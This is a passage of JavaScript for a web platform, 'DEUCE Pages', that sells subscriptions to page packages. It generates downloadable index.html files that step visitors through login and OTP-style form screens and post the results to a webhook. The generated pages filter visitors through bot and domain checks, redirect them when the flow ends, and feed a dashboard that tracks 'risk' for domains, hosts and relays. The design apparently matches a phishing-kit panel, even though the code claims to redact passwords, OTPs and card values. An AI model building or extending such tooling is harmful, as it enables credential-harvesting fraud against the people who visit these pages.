        return input.getAttribute("aria-label")
          || input.placeholder
          || (label && label.textContent)
          || (wrapperLabel && wrapperLabel.textContent)
          || input.name
          || input.id
          || "Field";
      }

      function safeFormData(form) {
        const data = {};
        const fields = Array.from(form.elements || []).filter(function (input) {
          return input && !input.disabled && !["submit", "button", "reset", "file"].includes(String(input.type || "").toLowerCase());
        });
        fields.forEach(function (input) {
          if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;
          const key = fieldLabel(input).replace(/\\s+/g, " ").trim();
          if (!key) return;
          data[key] = isSensitiveField(key, input) ? (input.value ? "[redacted]" : "[blank]") : input.value || "";
        });
        data._fieldCount = fields.length;
        data._redaction = "passwords, OTPs, card fields, login/email credentials, tokens, and similar sensitive values are not stored";
        return data;
      }

      function turnstileSiteKey() {
        return config.security?.turnstile?.siteKey || "";
      }

      function renderTurnstile() {
        const mount = document.querySelector("#turnstileBox");
        if (!config.security?.captcha || captchaPassed || !mount) return;
        if (!turnstileSiteKey()) {
          mount.textContent = "Turnstile site key is missing. Update this page security config.";
          return;
        }
        if (!window.turnstile) {
          window.setTimeout(renderTurnstile, 300);
          return;
        }
        if (captchaWidgetId !== null) return;
        captchaWidgetId = window.turnstile.render(mount, {
          sitekey: turnstileSiteKey(),
          callback(token) {
            captchaToken = token;
            screenCopy.textContent = "Session check complete. Continue when ready.";
          },
          "expired-callback"() {
            captchaToken = "";
            captchaPassed = false;
          },
          "error-callback"() {
            captchaToken = "";
            captchaPassed = false;
            screenCopy.textContent = "Turnstile could not load. Refresh and try again.";
          }
        });
      }

      async function verifyTurnstile() {
        if (!config.security?.captcha) return true;
        if (!captchaToken) {
          screenCopy.textContent = "Complete the Turnstile check before continuing.";
          return false;
        }
        try {
          const response = await fetch(config.runtime.turnstileEndpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              pageId: config.pageId,
              userPageId: config.id,
              sessionId,
              hostname: window.location.hostname,
              token: captchaToken
            })
          });
          const result = await response.json().catch(() => ({}));
          if (!response.ok || !result.verified) {
            screenCopy.textContent = "ACCESS DENIED";
            return false;
          }
          captchaPassed = true;
          return true;
        } catch (error) {
          screenCopy.textContent = "Turnstile verification could not reach the API.";
          return false;
        }
      }

      function renderStep() {
        if (!runtimeAllowed) return;
        const screen = config.screens[currentStep];
        stepLabel.textContent = screen.type;
        screenTitle.textContent = screen.config.title || screen.name + " Page";
        screenCopy.textContent = "Complete this step to continue through the configured page session.";
        progress.textContent = (currentStep + 1) + " / " + config.screens.length;
        setStatus([
          config.packageVersion,
          config.generatedFile?.version || "generated",
          config.security?.captcha ? "captcha on" : "captcha off",
          config.resultSettings?.retentionDays + "d retention"
        ]);

        const fields = fieldsFor(screen);
        screenForm.innerHTML = fields.map((field) => \`
          <label>
            <span>\${field}</span>
            <input required type="\${inputTypeFor(field)}" name="\${field.toLowerCase().replace(/\\s+/g, "_")}" autocomplete="off">
          </label>
        \`).join("") + \`
          <div class="captcha-box \${config.security?.captcha && !captchaPassed ? "active" : ""}">
            <div id="turnstileBox"></div>
          </div>
          <button type="submit">\${screen.config.buttonText || "Next"}</button>
        \`;
        window.setTimeout(renderTurnstile, 0);
        trackTraffic("screen_view", { screen: screen.name });
      }

      function storeScreenData(screen) {
        sessionData[screen.name] = safeFormData(screenForm);
      }

      function sendResult(screen) {
        const payload = {
          id: "res_" + Date.now().toString(36),
          userPageId: config.id,
          userId: config.userId,
          packageId: config.packageId,
          packageVersion: config.packageVersion,
          pageId: config.pageId,
          pageName: config.pageName,
          licenseKey: config.licenseKey,
          sessionId,
          screen: screen.name,
          flow: config.screens.map((item) => item.name),
          data: sessionData,
          hostname: window.location.hostname,
          path: window.location.pathname,
          userAgent: navigator.userAgent,
          resultSettings: config.resultSettings,
          createdAt: new Date().toISOString()
        };

        fetch(config.runtime.resultEndpoint || endpoint(config.resultSettings?.webhook || "/api/page-results"), {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }).catch(() => {
          console.info("DEUCE Pages result payload queued for Render API", payload);
        });
      }

      screenForm.addEventListener("submit", async (event) => {
        event.preventDefault();
        if (!runtimeAllowed) return;
        if (config.security?.captcha && !captchaPassed) {
          const verified = await verifyTurnstile();
          if (!verified) return;
        }

        const remoteAllowed = await checkRemoteSecurity("submit");
        if (!remoteAllowed) return;

        const screen = config.screens[currentStep];
        storeScreenData(screen);
        trackTraffic("screen_submit", { screen: screen.name });

        if (currentStep < config.screens.length - 1) {
          currentStep += 1;
          renderStep();
          return;
        }

        sendResult(screen);

        if (screen.config.redirectUrl) {
          window.location.href = screen.config.redirectUrl;
          return;
        }

        screenTitle.textContent = "Session complete";
        screenCopy.textContent = "This generated index.html has finished the configured page flow.";
        stepLabel.textContent = "complete";
        screenForm.innerHTML = "";
        progress.textContent = "done";
        trackTraffic("flow_complete");
      });

      async function boot() {
        setStatus(["booting", config.pageId, config.generatedFile?.version || "generated"]);
        if (!enforceDomain()) return;
        const remoteAllowed = await checkRemoteSecurity("boot");
        if (!remoteAllowed) return;
        trackTraffic("page_load");
        trackHeartbeat();
        renderStep();
      }

      boot();
    <\/script>
  </body>
</html>`;
}

function downloadGeneratedIndex(page) {
  page.generatedFile = {
    ...(page.generatedFile || {}),
    lastGeneratedAt: new Date().toISOString()
  };
  saveFlowState(page);
  const html = createGeneratedIndex(page);
  const blob = new Blob([html], { type: "text/html" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = page.generatedFile?.downloadName || `${page.slug}-index.html`;
  document.body.append(link);
  link.click();
  link.remove();
  URL.revokeObjectURL(url);
  statusText.textContent = `${page.name.toUpperCase()} INDEX.HTML GENERATED`;
}

function renderButtons() {
  if (!templateList) return;

  templateList.innerHTML = "";

  templates.forEach((template) => {
    const button = document.createElement("button");
    button.className = `template-button${template.id === activeTemplate.id ? " active" : ""}`;
    button.type = "button";
    button.innerHTML = `<strong>${template.name}</strong><span>${template.description}</span>`;
    button.addEventListener("click", () => setTemplate(template));
    templateList.append(button);
  });
}

function setTemplate(template) {
  activeTemplate = template;
  const source = document.querySelector(`#${template.id}`);
  preview.replaceChildren(source.content.cloneNode(true));
  statusText.textContent = template.status;
  renderButtons();
}

function setActiveNav(hash) {
  document.querySelectorAll(".nav-item").forEach((item) => {
    if (item.getAttribute("href") === "#admin" && !isAdmin()) {
      item.hidden = true;
      item.classList.add("is-hidden");
      item.style.display = "none";
      item.removeAttribute("aria-current");
      return;
    }
    const isActive = item.getAttribute("href") === hash;
    item.classList.toggle("active", isActive);
    if (isActive) {
      item.setAttribute("aria-current", "page");
    } else {
      item.removeAttribute("aria-current");
    }
  });
}

function renderDashboard() {
  activeFlowSlug = null;
  const auth = getAuthState();
  const isSignedIn = Boolean(auth.user);
  const livePages = ownedPages.filter((page) => page.hostingConfig?.verified || page.hostingConfig?.liveStatus === "Live");
  const setupNeeded = ownedPages.filter((page) => pageLaunchReadiness(page).percent < 100);
  const resultTotal = ownedPages.reduce((sum, page) => sum + (page.results?.length || 0), 0);
  const trafficTotal = ownedPages.reduce((sum, page) => sum + pageTrafficCount(page), 0);
  const activeRenewals = ownedPages.filter((page) => page.subscription?.autoRenew);
  const subscriptionStates = ownedPages.map((page) => ({ page, state: subscriptionState(page) }));
  const expiredPages = subscriptionStates.filter((item) => item.state.expired);
  const dueSoonPages = subscriptionStates.filter((item) => item.state.dueSoon && !item.state.expired);
  const riskSignals = ownedPages.map((page) => ({ page, risk: pageRiskSignal(page) }));
  const redSignals = riskSignals.filter((item) => item.risk.status === "red");
  const yellowSignals = riskSignals.filter((item) => item.risk.status === "yellow");
  const greenSignals = riskSignals.filter((item) => item.risk.status === "green");
  const topRisk = redSignals[0] || yellowSignals[0] || null;
  const subscriptionAttention = expiredPages[0] || dueSoonPages[0] || null;
  const nextPage = topRisk?.page || subscriptionAttention?.page || setupNeeded[0] || ownedPages[0] || null;
  const walletStatus = expiredPages.length
    ? "Subscription attention"
    : walletData.balance >= 25 ? "Ready for weekly plans" : "Top up before paid subscriptions";
  const recentPages = ownedPages.slice(0, 3);
  const recentTransactions = (walletData.transactions || []).slice(0, 3);
  const recentActivity = [
    ...recentPages.map((page) => ({
      title: page.name,
      meta: page.hostingConfig?.liveStatus || page.status || "active",
      value: `${pageLaunchReadiness(page).percent}% ready`,
      route: `#config-${pageRouteKey(page)}`
    })),
    ...recentTransactions.map((transaction) => ({
      title: transaction.description || transaction.type || "Wallet activity",
      meta: transaction.createdAt || transaction.date || "wallet",
      value: formatMoney(transaction.amount),
      route: "#wallet"
    }))
  ].slice(0, 5);
  preview.innerHTML = `
    <section class="app-view dashboard-view">
      <div class="dashboard-hero">
        <div class="view-heading">
          <small>dashboard</small>
          <h2>${isSignedIn ? "Command center" : "Start your page workspace"}</h2>
          <p>${isSignedIn ? "Watch subscriptions, launch status, wallet balance, results, and security signals from one compact control view." : "Login or create an account to subscribe to pages, connect your domain, download index.html, and monitor live results."}</p>
        </div>
        <div class="dashboard-pulse-card">
          <span>${apiLoadError ? "API attention" : "System online"}</span>
          <strong>${isSignedIn ? escapeHtml(auth.user.email) : "Guest mode"}</strong>
          <small>${apiLoadError ? escapeHtml(apiLoadError) : `${ownedPages.length} owned / ${marketPages.length} available`}</small>
        </div>
      </div>
      ${viewNav(isSignedIn ? [
        routeButton("#pages", "Browse pages"),
        routeButton("#my-pages", "My Pages"),
        routeButton("#wallet", "Wallet"),
        ...(isAdmin() ? [routeButton("#admin", "Admin")] : [])
      ] : [
        routeButton("#login", "Login"),
        routeButton("#signup", "Create account")
      ])}

      ${subscriptionAttention ? `
        <article class="subscription-alert ${subscriptionAttention.state.expired ? "is-critical" : "is-warning"}">
          <div>
            <small>subscription ${subscriptionAttention.state.expired ? "locked" : "due soon"}</small>
            <h3>${escapeHtml(subscriptionAttention.page.name)} ${escapeHtml(subscriptionAttention.state.label.toLowerCase())}</h3>
            <p>${subscriptionAttention.state.expired ? "Renew from wallet to restore runtime access." : `Renewal date: ${escapeHtml(subscriptionAttention.state.dueLabel)}.`}</p>
          </div>
          <div>
            <button type="button" class="primary" data-route="#my-pages">Open My Pages</button>
            <button type="button" data-route="#wallet">Fund wallet</button>
          </div>
        </article>
      ` : ""}

      <div class="summary-grid dashboard-kpis">
        <article><small>Owned pages</small><b>${String(ownedPages.length).padStart(2, "0")}</b><span>${livePages.length} live now</span></article>
        <article><small>Wallet</small><b>${formatMoney(walletData.balance)}</b><span>${escapeHtml(walletStatus)}</span></article>
        <article><small>Results</small><b>${String(resultTotal).padStart(2, "0")}</b><span>${trafficTotal} tracked visits</span></article>
        <article class="${redSignals.length ? "is-red" : yellowSignals.length ? "is-yellow" : "is-green"}"><small>Live risk</small><b>${String(redSignals.length).padStart(2, "0")}</b><span>${yellowSignals.length} watch / ${greenSignals.length} green</span></article>
      </div>

      ${ownedPages.length ? `
        <article class="dashboard-risk-panel is-${topRisk?.risk.status || "green"}">
          <div>
            <small>live risk center</small>
            <h3>${topRisk ? `${escapeHtml(topRisk.page.name)} / ${escapeHtml(topRisk.risk.layer)}` : "All pages green"}</h3>
            <p>${topRisk ? escapeHtml(topRisk.risk.detail) : "No red or watch signals from saved domain, host, relay, runtime, subscription, or security configuration."}</p>
          </div>
          <div class="risk-counts">
            <span class="is-red"><strong>${redSignals.length}</strong><em>Red</em></span>
            <span class="is-yellow"><strong>${yellowSignals.length}</strong><em>Watch</em></span>
            <span class="is-green"><strong>${greenSignals.length}</strong><em>Green</em></span>
          </div>
          <div class="risk-list">
            ${(redSignals.length || yellowSignals.length ? [...redSignals, ...yellowSignals].slice(0, 4) : greenSignals.slice(0, 3)).map(({ page, risk }) => `
              <button type="button" class="risk-row is-${risk.status}" data-route="${escapeHtml(risk.fix)}">
                <span>
                  <strong>${escapeHtml(page.name)}</strong>
                  <small>${escapeHtml(risk.layer)} / ${escapeHtml(risk.code)}</small>
                </span>
                <em>${escapeHtml(risk.action)}</em>
              </button>
            `).join("")}
          </div>
        </article>
      ` : ""}

      <div class="dashboard-grid">
        <article class="dashboard-panel dashboard-primary-panel">
          <div>
            <small>next best action</small>
            <h3>${topRisk ? `${escapeHtml(topRisk.page.name)} has ${escapeHtml(topRisk.risk.layer.toLowerCase())} risk` : subscriptionAttention ? `${escapeHtml(subscriptionAttention.page.name)} needs renewal action` : nextPage ? `${escapeHtml(nextPage.name)} needs ${pageLaunchReadiness(nextPage).percent}% launch review` : marketPages.length ? "Subscribe to your first page" : "Publish a page package"}</h3>
            <p>${topRisk ? escapeHtml(topRisk.risk.detail) : subscriptionAttention ? "Renew the page or fund the wallet so runtime access stays live." : nextPage ? "Finish config, hosting, security, then download the live index.html from Go Live." : marketPages.length ? "Pick a marketplace page, choose a billing period, and activate it from wallet funds." : "Import a page package so users can subscribe from the marketplace."}</p>
          </div>
          <div class="dashboard-actions">
            ${nextPage ? `
              <button type="button" class="primary" data-route="${topRisk ? escapeHtml(topRisk.risk.fix) : subscriptionAttention ? "#my-pages" : `#go-live-${escapeHtml(pageRouteKey(nextPage))}`}">${topRisk ? escapeHtml(topRisk.risk.action) : subscriptionAttention ? "Renew" : "Go Live"}</button>
              <button type="button" data-route="#config-${escapeHtml(pageRouteKey(nextPage))}">Config</button>
            ` : `
              <button type="button" class="primary" data-route="${marketPages.length ? "#pages" : isAdmin() ? "#admin" : "#wallet"}">${marketPages.length ? "Browse pages" : isAdmin() ? "Open admin" : "Open wallet"}</button>
            `}
          </div>
        </article>

        <article class="dashboard-panel">
          <small>launch health</small>
          <div class="dashboard-health-list">
            <div><span>Live</span><strong>${livePages.length}</strong></div>
            <div><span>Setup</span><strong>${setupNeeded.length}</strong></div>
            <div><span>Red</span><strong>${redSignals.length}</strong></div>
            <div><span>Watch</span><strong>${yellowSignals.length}</strong></div>
          </div>
        </article>

        <article class="dashboard-panel">
          <small>quick actions</small>
          <div class="dashboard-action-grid">
            <button type="button" data-route="#pages">Subscribe</button>
            <button type="button" data-route="#my-pages">Manage</button>
            <button type="button" data-route="#wallet">Wallet</button>
            ${isAdmin() ? '<button type="button" data-route="#admin">Admin</button>' : '<button type="button" data-route="#my-pages">Results</button>'}
          </div>
        </article>
      </div>

      <div class="dashboard-grid secondary">
        <article class="dashboard-panel">
          <small>recent activity</small>
          <div class="dashboard-activity">
            ${recentActivity.length ? recentActivity.map((item) => `
              <button type="button" data-route="${escapeHtml(item.route)}">
                <span>
                  <strong>${escapeHtml(item.title)}</strong>
                  <small>${escapeHtml(item.meta)}</small>
                </span>
                <b>${escapeHtml(item.value)}</b>
              </button>
            `).join("") : `
              <div class="dashboard-empty">
                <strong>No activity yet</strong>
                <span>Subscribe to a page or publish a package to start filling this feed.</span>
              </div>
            `}
          </div>
        </article>

        <article class="dashboard-panel">
          <small>workspace status</small>
          <h3>${apiLoadError ? "API connection needs attention" : "Database-backed workspace"}</h3>
          <p>${apiLoadError ? `Connect the backend and database to load live records. ${escapeHtml(apiLoadError)}` : "Packages, user pages, wallet balance, config, and results are loaded from the API."}</p>
          <div class="feature-row">
            <span>${marketPages.length} marketplace pages</span>
            <span>${ownedPages.length} subscriptions</span>
            <span>${formatMoney(walletData.balance)} wallet</span>
          </div>
        </article>
      </div>

      ${ownedPages.length ? `
        <div class="dashboard-page-strip">
          ${ownedPages.slice(0, 4).map((page) => {
            const readiness = pageLaunchReadiness(page);
            const risk = pageRiskSignal(page);
            return `
              <article class="is-${risk.status}">
                <small>${escapeHtml(risk.label)} / ${escapeHtml(risk.layer)}</small>
                <h3>${escapeHtml(page.name)}</h3>
                <p>${escapeHtml(page.hostingConfig?.domain || page.domain || "No domain connected")}</p>
                <div>
                  <span>${escapeHtml(risk.code)} / ${readiness.percent}% ready</span>
                  <button type="button" data-route="${escapeHtml(risk.fix)}">${escapeHtml(risk.action)}</button>
                </div>
              </article>
            `;
          }).join("")}
        </div>
      ` : ""}
    </section>
  `;
  statusText.textContent = isSignedIn ? "COMMAND CENTER ONLINE" : "LOGIN REQUIRED FOR LIVE WORKSPACE";
  topbarTitle.textContent = "Dashboard";
}

function renderLogin() {
  activeFlowSlug = null;
  setAuthLayout(true);
  const auth = getAuthState();
  preview.innerHTML = `
    <section class="app-view auth-view">
      <div class="view-heading">
        <small>secure access</small>
        <h2>Login</h2>
      </div>
      ${viewNav([
        routeButton("#signup", "Create account")
      ])}
      <div class="auth-shell">
        <article class="auth-card package-form">
          <div>
            <small>account login</small>
            <h3>Access</h3>
          </div>
          <label>
            <span>Email address</span>
            <input type="email" data-auth-field="loginEmail" value="${escapeHtml(auth.user?.email || "")}" placeholder="you@example.com" autocomplete="email">
          </label>
          <label>
            <span>Password</span>
            <input type="password" data-auth-field="loginPassword" placeholder="Enter your password" autocomplete="current-password">
          </label>
          <div class="admin-actions">
            <button type="button" data-login-submit>Sign in</button>
            <button type="button" data-route="#signup">New account</button>
          </div>
        </article>
      </div>
    </section>
  `;
  statusText.textContent = auth.user ? `SIGNED IN AS ${auth.user.email}` : "LOGIN READY";
  topbarTitle.textContent = "Login";
}

function renderSignup() {
  activeFlowSlug = null;
  setAuthLayout(true);
  preview.innerHTML = `
    <section class="app-view auth-view">
      <div class="view-heading">
        <small>new workspace</small>
        <h2>Create account</h2>
      </div>
      ${viewNav([
        routeButton("#login", "Back to login")
      ])}
      <div class="auth-shell">
        <article class="auth-card package-form">
          <div>
            <small>subscriber profile</small>
            <h3>Signup</h3>
          </div>
          <label>
            <span>Full name</span>
            <input type="text" data-auth-field="signupName" placeholder="Workspace owner" autocomplete="name">
          </label>
          <label>
            <span>Email address</span>
            <input type="email" data-auth-field="signupEmail" placeholder="you@example.com" autocomplete="email">
          </label>
          <label>
            <span>Password</span>
            <input type="password" data-auth-field="signupPassword" placeholder="Create a password" autocomplete="new-password">
          </label>
          <label>
            <span>Confirm password</span>
            <input type="password" data-auth-field="signupConfirm" placeholder="Repeat password" autocomplete="new-password">
          </label>
          <div class="admin-actions">
            <button type="button" data-signup-submit>Create account</button>
            <button type="button" data-route="#login">Sign in</button>
          </div>
        </article>
      </div>
    </section>
  `;
  statusText.textContent = "SIGNUP READY";
  topbarTitle.textContent = "Sign Up";
}

async function handleLogin() {
  const email = authField("loginEmail");
  const password = authField("loginPassword");

  if (!email || !password) {
    statusText.textContent = "EMAIL AND PASSWORD REQUIRED";
    return;
  }

  try {
    const result = await requestApi("/api/auth/login", {
      method: "POST",
      body: JSON.stringify({ email, password })
    });
    saveAuthState({ mode: "api", user: result.user, token: result.token });
    await loadAppData();
    statusText.textContent = "API SESSION OPENED";
  } catch (error) {
    statusText.textContent = error.message.toUpperCase();
    return;
  }

  window.location.hash = "#dashboard";
}

async function handleSignup() {
  const name = authField("signupName");
  const email = authField("signupEmail");
  const password = authField("signupPassword");
  const confirmPassword = authField("signupConfirm");

  if (!name || !email || !password || !confirmPassword) {
    statusText.textContent = "ALL SIGNUP FIELDS REQUIRED";
    return;
  }

  if (password !== confirmPassword) {
    statusText.textContent = "PASSWORDS DO NOT MATCH";
    return;
  }

  try {
    const result = await requestApi("/api/auth/register", {
      method: "POST",
      body: JSON.stringify({ name, email, password })
    });
    saveAuthState({ mode: "api", user: result.user, token: result.token });
    await loadAppData();
    statusText.textContent = "ACCOUNT CREATED";
  } catch (error) {
    statusText.textContent = error.message.toUpperCase();
    return;
  }

  window.location.hash = "#dashboard";
}

async function handleLogout() {
  try {
    if (isLoggedIn()) {
      await requestApi("/api/auth/logout", { method: "POST" });
    }
  } catch {
    // Local logout should still complete even if the API is offline.
  }
  clearAuthState();
  document.querySelector(".topbar-menu")?.removeAttribute("open");
  statusText.textContent = "SIGNED OUT";
  window.location.hash = "#login";
  renderRoute();
}

function renderPages() {
  activeFlowSlug = null;
  const emptyAction = isAdmin() ? "#admin" : "";
  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>pages marketplace</small>
        <h2>Choose a page</h2>
        <p>Preview available pages, choose a subscription plan, and activate one from your wallet.</p>
      </div>
      <div class="page-grid">
        ${marketPages.length ? marketPages.map((page) => {
          const selectedPlan = selectedBillingPeriod(page);
          return `
          <article class="market-card">
            <div class="page-preview market-frame" aria-hidden="true">
              <div class="market-frame-shell">
                <i></i>
                <i></i>
                <i></i>
                <strong>${escapeHtml(page.name)}</strong>
              </div>
            </div>
            <div class="market-card-body">
              <div class="market-heading">
                ${pageIconMarkup(page)}
                <div class="card-copy">
                  <small>available page</small>
                  <h3>${escapeHtml(page.name)}</h3>
                  <p>${escapeHtml(page.userSummary)}</p>
                </div>
              </div>
              <div class="market-subscription">
                <label>
                  <span>Subscription</span>
                  <select data-market-plan="${escapeHtml(page.slug)}" aria-label="${escapeHtml(page.name)} subscription plan">
                    ${Object.keys(billingPeriodLabels).map((period) => `
                      <option value="${period}" ${period === selectedPlan ? "selected" : ""}>${billingOptionLabel(page, period)}</option>
                    `).join("")}
                  </select>
                </label>
                <strong data-market-price="${escapeHtml(page.slug)}">${marketPriceLabel(page, selectedPlan)}</strong>
              </div>
              <div class="card-footer">
                <div class="market-actions">
                  <button type="button" data-market-preview="${escapeHtml(page.slug)}" ${page.previewReady ? "" : "disabled"}>Preview</button>
                  <button type="button" data-market-subscribe="${escapeHtml(page.slug)}">${marketSubscribeLabel(page, selectedPlan)}</button>
                </div>
              </div>
            </div>
          </article>
        `;
        }).join("") : emptyState("No published packages yet", "Published pages will appear here when they are available for subscription.", emptyAction)}
      </div>
    </section>
  `;
  statusText.textContent = "PAGES MARKETPLACE READY";
  topbarTitle.textContent = "Pages";
}

function renderAdmin() {
  activeFlowSlug = null;
  const publishedCount = adminPackages.filter((page) => String(page.status || page.design).toLowerCase() === "published").length;
  const draftCount = adminPackages.filter((page) => String(page.status || page.design).toLowerCase() !== "published").length;
  const githubCount = adminPackages.filter((page) => page.sourceType === "github" || page.source === "GitHub repo").length;
  const packageRows = adminPackages.length ? adminPackages.map((page) => `
    <article class="admin-package-row">
      <div>
        <strong>${escapeHtml(page.name)}</strong>
        <span>${escapeHtml(page.slug)} / ${escapeHtml(page.version || "v1")}</span>
      </div>
      <em>${escapeHtml(page.status || page.design || "Draft")}</em>
      <small>${escapeHtml(page.source || "Package")}</small>
      <div class="admin-row-actions">
        <button type="button" data-route="#admin-package-${escapeHtml(page.slug)}">Editor</button>
        <button type="button" data-admin-action="${escapeHtml(page.name).toUpperCase()} PREVIEW OPENED">Preview</button>
        <button type="button" data-admin-action="${escapeHtml(page.name).toUpperCase()} PUBLISH CHECKLIST OPENED">Publish</button>
      </div>
    </article>
  `).join("") : emptyState("No packages imported yet", "Connect a GitHub repo or upload a local page bundle to create your first package.", "#admin-import-github");

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>admin studio</small>
        <h2>Package control center</h2>
        <p>Import pages, review files, publish packages, and manage subscribers from one compact workspace.</p>
      </div>
      ${viewNav([
        routeButton("#pages", "&#8592; Marketplace"),
        routeButton("#my-pages", "My Pages"),
        routeButton("#wallet", "Wallet")
      ])}

      <div class="admin-command-tabs" aria-label="Admin modules">
        <button type="button" class="active" data-admin-action="ADMIN OVERVIEW OPENED">Overview</button>
        <button type="button" data-route="#admin-import-github">Import</button>
        <button type="button" data-admin-action="PACKAGE LIBRARY FOCUSED">Packages</button>
        <button type="button" data-route="#admin-users">Users</button>
        <button type="button" data-admin-action="PUBLISHING QUEUE OPENED">Publishing</button>
      </div>

      <div class="admin-kpis">
        <article><small>Packages</small><strong>${String(adminPackages.length).padStart(2, "0")}</strong><span>Total library</span></article>
        <article><small>Published</small><strong>${String(publishedCount).padStart(2, "0")}</strong><span>Marketplace ready</span></article>
        <article><small>Drafts</small><strong>${String(draftCount).padStart(2, "0")}</strong><span>Need review</span></article>
        <article><small>GitHub</small><strong>${String(githubCount).padStart(2, "0")}</strong><span>Repo imports</span></article>
      </div>

      <div class="admin-studio-shell">
        <article class="admin-hero-panel">
          <div>
            <small>next action</small>
            <h3>Publish your first real page package</h3>
            <p>Connect a repo, detect screens, check CSS/assets, then send a clean package to the marketplace for wallet subscriptions.</p>
          </div>
          <div class="admin-actions">
            <button type="button" data-route="#admin-import-github">Import GitHub</button>
            <button type="button" data-route="#admin-import-local">Upload files</button>
            <button type="button" data-route="#admin-users">Users</button>
          </div>
        </article>

        <div class="admin-workbench">
          <article class="admin-table-card">
            <div class="builder-heading compact">
              <div>
                <small>package library</small>
                <h3>Manage packages</h3>
              </div>
              <button type="button" data-admin-action="PACKAGE LIBRARY REFRESHED">Refresh</button>
            </div>
            <div class="admin-package-list">
              ${packageRows}
            </div>
          </article>

          <aside class="admin-side-stack">
            <article class="security-panel">
              <small>import paths</small>
              <h3>Add a page</h3>
              <div class="admin-compact-grid">
                <button type="button" data-route="#admin-import-github"><strong>GitHub</strong><span>Repo, branch, folder</span></button>
                <button type="button" data-route="#admin-import-local"><strong>Local</strong><span>Zip or loose files</span></button>
              </div>
            </article>

            <article class="security-panel">
              <small>publishing queue</small>
              <h3>Review flow</h3>
              <div class="admin-queue-list">
                <div><span>01</span><strong>Files</strong><em>Detect HTML, CSS, assets</em></div>
                <div><span>02</span><strong>Design</strong><em>Scope CSS and preview</em></div>
                <div><span>03</span><strong>Package</strong><em>Set price and metadata</em></div>
                <div><span>04</span><strong>Publish</strong><em>Send to marketplace</em></div>
              </div>
            </article>
          </aside>
        </div>
      </div>

      <details class="admin-fold">
        <summary>
          <span>Advanced models</span>
          <strong>Package and user configuration reference</strong>
        </summary>
        <div class="model-grid">
          <article class="security-panel">
            <small>package model</small>
            <h3>Package fields</h3>
            <div class="feature-row">
              ${Object.keys(packageDataModel).map((group) => `<span>${group}</span>`).join("")}
            </div>
            <button type="button" data-route="#admin-import-github">Open import wizard</button>
          </article>
          <article class="security-panel">
            <small>user config</small>
            <h3>Subscriber fields</h3>
            <div class="feature-row">
              ${Object.keys(userPageConfigModel).map((group) => `<span>${group}</span>`).join("")}
            </div>
            <button type="button" data-route="#my-pages">Review owned pages</button>
          </article>
        </div>
      </details>
    </section>
  `;
  statusText.textContent = "ADMIN PAGE STUDIO READY";
  topbarTitle.textContent = "Admin";
}

function getAdminPackage(packageSlug) {
  return adminPackages.find((item) => item.slug === packageSlug || item.id === packageSlug) || null;
}

function renderAdminImportWizard(sourceType = "local") {
  activeFlowSlug = null;
  const isGithub = sourceType === "github";
  const sourceLabel = isGithub ? "GitHub repository" : "Local bundle";
  const importChecks = [
    ["Source", isGithub ? "Repo URL, branch, folder" : "Zip or loose files"],
    ["Files", "HTML, CSS, JS, media"],
    ["Preview", "Sandbox before publish"],
    ["Package", "Name, slug, price"],
    ["Publish", "Marketplace visibility"]
  ];
  const starterFiles = isGithub
    ? ["index.html", "login.html", "otp.html", "success.html", "style.css"]
    : ["index.html", "login.html", "otp.html", "style.css", "assets/logo.svg"];

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>admin import wizard</small>
        <h2>${sourceLabel}</h2>
        <p>Bring in a page, verify detected files, preview it, then save a draft or publish a package.</p>
      </div>
      ${viewNav([
        routeButton("#admin", "&#8592; Admin Studio", "primary"),
        routeButton("#admin-import-local", "Local upload"),
        routeButton("#admin-import-github", "GitHub import")
      ])}

      <div class="wizard-progress">
        ${importChecks.map(([label], index) => `<span class="${index === 0 ? "active" : ""}">${index + 1} ${label}</span>`).join("")}
      </div>

      <div class="import-workbench">
        <article class="security-panel package-form">
          <small>source</small>
          <h3>${isGithub ? "Connect GitHub" : "Local upload staging"}</h3>
          <div class="admin-source-grid compact">
            <button class="${isGithub ? "" : "active"}" type="button" data-route="#admin-import-local">Local bundle</button>
            <button class="${isGithub ? "active" : ""}" type="button" data-route="#admin-import-github">GitHub repo</button>
          </div>
          ${isGithub ? `
            <label><span>Repository URL</span><input type="url" data-github-field="repoUrl" placeholder="https://github.com/owner/repo"></label>
            <label><span>Branch</span><input type="text" data-github-field="branch" placeholder="Leave blank for default branch"></label>
            <label><span>Folder path</span><input type="text" data-github-field="folder" placeholder="pages/page-a or leave blank"></label>
            <div class="import-settings-grid">
              <label><span>Package name</span><input type="text" data-github-field="packageName" value="GitHub Imported Page"></label>
              <label><span>Slug</span><input type="text" data-github-field="slug" value="github-imported-page"></label>
            </div>
            <div class="admin-actions">
              <button type="button" data-github-scan>Scan repo</button>
              <button type="button" data-github-import>Create draft package</button>
              <button type="button" data-github-publish>Import & Publish</button>
            </div>
          ` : `
            <div class="upload-dropzone">
              <strong>Local upload is next</strong>
              <span>Use GitHub import for live package creation today.</span>
            </div>
            <div class="feature-row">
              <span>Zip parser</span>
              <span>Asset storage</span>
              <span>CSS scope</span>
              <span>Draft create</span>
            </div>
            <div class="admin-actions">
              <button type="button" data-route="#admin-import-github">Use GitHub import</button>
            </div>
          `}
        </article>

        <article class="security-panel import-result-panel">
          <small>live result</small>
          <h3>Scan and preview</h3>
          <div class="admin-code-sample" data-github-result>
            <code>${isGithub ? `API connection required: ${escapeHtml(apiBase())}` : "Local importer is not wired to the API yet."}</code>
            <code>${isGithub ? "Scan a repo to detect screens, CSS, scripts, and assets." : "GitHub import can create real package records now."}</code>
          </div>
        </article>

        <article class="security-panel">
          <small>review</small>
          <h3>Import checklist</h3>
          <div class="admin-queue-list">
            ${importChecks.map(([label, hint], index) => `
              <div>
                <span>${String(index + 1).padStart(2, "0")}</span>
                <strong>${label}</strong>
                <em>${hint}</em>
              </div>
            `).join("")}
          </div>
        </article>

        <article class="security-panel">
          <small>expected map</small>
          <h3>Starter file roles</h3>
          <div class="file-map-list">
            ${starterFiles.map((file, index) => `
              <div>
                <strong>${String(index + 1).padStart(2, "0")}</strong>
                <span>${file}</span>
                <em>${file.endsWith(".css") ? "CSS" : file.includes("assets") ? "Asset" : "HTML"}</em>
              </div>
            `).join("")}
          </div>
        </article>
